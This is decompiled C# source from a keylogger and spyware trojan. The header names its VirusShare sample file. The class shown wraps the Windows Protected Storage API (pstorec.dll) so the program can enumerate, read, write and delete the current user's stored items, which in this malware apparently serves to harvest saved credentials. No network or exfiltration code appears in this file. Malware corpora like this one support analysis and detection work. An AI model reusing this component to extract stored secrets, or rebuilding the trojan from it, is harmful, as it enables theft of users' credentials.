// Decompiled with JetBrains decompiler
// Type: Roy.CProtectStore
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Roy.PStoreLib;
using System;
using System.Runtime.InteropServices;

namespace Roy
{
  internal class CProtectStore : CUtils
  {
    private IPStore m_PStore;
    private PST_KEY m_KeyType;

    public CProtectStore()
    {
      this.m_PStore = CProtectStore.GetPStoreInterface();
      this.m_KeyType = PST_KEY.PST_KEY_CURRENT_USER;
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int lstrlenA(int lpString);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int lstrlenW(int lpString);

    [DllImport("pstorec.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int PStoreCreateInstance(
      ref IPStore ppProvider,
      ref Guid pProviderID,
      int pReserved,
      int dwFlags);

    private static IPStore GetPStoreInterface()
    {
      IPStore pstoreInterface = (IPStore) null;
      ref IPStore local1 = ref pstoreInterface;
      Guid basePstproviderSzid = guidProvider.MS_BASE_PSTPROVIDER_SZID;
      ref Guid local2 = ref basePstproviderSzid;
      CProtectStore.PStoreCreateInstance(ref local1, ref local2, 0, 0);
      return pstoreInterface;
    }

    public PST_KEY KeyType
    {
      get => this.m_KeyType;
      set => this.m_KeyType = value;
    }

    public CTypes Types => new CTypes(this.m_PStore, this.m_KeyType);

    public CItems get_Items(Guid guidItemType, Guid guidItemSubType) => new CItems(this.m_PStore, this.m_KeyType, ref guidItemType, ref guidItemSubType);

    public void CreateType(Guid guidItemType, string szDisplayName)
    {
      PST_TYPEINFO pInfo;
      pInfo.cbSize = Marshal.SizeOf((object) pInfo);
      pInfo.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
      try
      {
        this.m_PStore.CreateType(this.m_KeyType, ref guidItemType, ref pInfo, 0);
      }
      finally
      {
        Marshal.FreeHGlobal(pInfo.szDisplayName);
      }
    }

    public void CreateSubType(Guid guidItemType, Guid guidItemSubType, string szDisplayName)
    {
      PST_TYPEINFO pInfo;
      pInfo.cbSize = Strings.Len((object) pInfo);
      pInfo.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
      try
      {
        PST_ACCESSRULESET pRules;
        pRules.cbSize = Marshal.SizeOf((object) pRules);
        pRules.cRules = 0;
        pRules.rgRules = 0;
        this.m_PStore.CreateSubtype(this.m_KeyType, ref guidItemType, ref guidItemSubType, ref pInfo, ref pRules, 0);
      }
      finally
      {
        Marshal.FreeHGlobal(pInfo.szDisplayName);
      }
    }

    public void DeleteItem(Guid guidItemType, Guid guidItemSubType, string szItemName) => this.m_PStore.DeleteItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, 0, 0);

    public void DeleteType(Guid guidItemType) => this.m_PStore.DeleteType(this.m_KeyType, ref guidItemType, 0);

    public void DeleteSubType(Guid guidItemType, Guid guidItemSubType) => this.m_PStore.DeleteSubtype(this.m_KeyType, ref guidItemType, ref guidItemSubType, 0);

    public byte[] ReadItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
    {
      byte[] destination = (byte[]) null;
      int pcbData;
      IntPtr ppbData;
      this.m_PStore.ReadItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, ref pcbData, ref ppbData, 0, 0);
      if (ppbData != IntPtr.Zero)
      {
        destination = new byte[checked (pcbData - 1 + 1)];
        Marshal.Copy(ppbData, destination, 0, pcbData);
      }
      return destination;
    }

    public void WriteItem(
      Guid guidItemType,
      Guid guidItemSubType,
      string szItemName,
      int ptrBuff,
      int pcbBuff)
    {
      PST_PROMPTINFO pPromptInfo;
      pPromptInfo.cbSize = Marshal.SizeOf((object) pPromptInfo);
      pPromptInfo.dwPromptFlags = 2;
      pPromptInfo.hwndApp = 0;
      pPromptInfo.szPrompt = 0;
      this.m_PStore.WriteItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, pcbBuff, ptrBuff, ref pPromptInfo, 1, 0);
    }
  }
}
